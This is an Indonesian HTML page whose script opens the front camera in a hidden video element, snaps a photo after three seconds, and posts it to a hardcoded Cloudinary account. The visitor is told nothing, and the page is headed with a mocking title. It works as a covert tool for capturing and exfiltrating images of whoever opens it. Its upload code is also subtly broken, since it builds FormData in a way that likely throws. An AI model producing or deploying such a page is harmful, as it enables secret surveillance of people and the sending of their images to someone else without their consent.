<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kamera Otomatis</title>
    <style>
        body { text-align: center; font-family: Arial, sans-serif; }
        #preview { margin-top: 20px; border: 2px solid black; }
    </style>
</head>
<body>
    <h1>ORANG GILA :</h1>
    <video id="camera" autoplay playsinline style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <img id="preview" alt="Foto akan muncul di sini">

    <script>
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const preview = document.getElementById('preview');
        const ctx = canvas.getContext('2d');

        // **1. Aktifkan Kamera Depan**
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => { video.srcObject = stream; })
            .catch(err => console.error("Akses kamera ditolak!", err));

        // **2. Ambil Foto Otomatis Setelah 3 Detik**
        setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            preview.src = canvas.toDataURL("image/png");

            // **3. Upload ke Cloudinary**
            uploadToCloudinary(canvas.toDataURL("image/png"));
        }, 3000);

        // **4. Fungsi Upload ke Cloudinary**
        function uploadToCloudinary(imageData) {
            let cloudName = "dl5dswv7q";  // Ganti dengan Cloud Name kamu
            let uploadPreset = "tikontol";  // Ganti dengan Upload Preset kamu

            fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                method: "POST",
                body: new FormData(Object.assign(new FormData(), {
                    file: imageData,
                    upload_preset: uploadPreset
                }))
            })
            .then(res => res.json())
            .then(data => console.log("Foto tersimpan di:", data.secure_url))
            .catch(err => console.error("Gagal upload!", err));
        }
    </script>
</body>
</html>
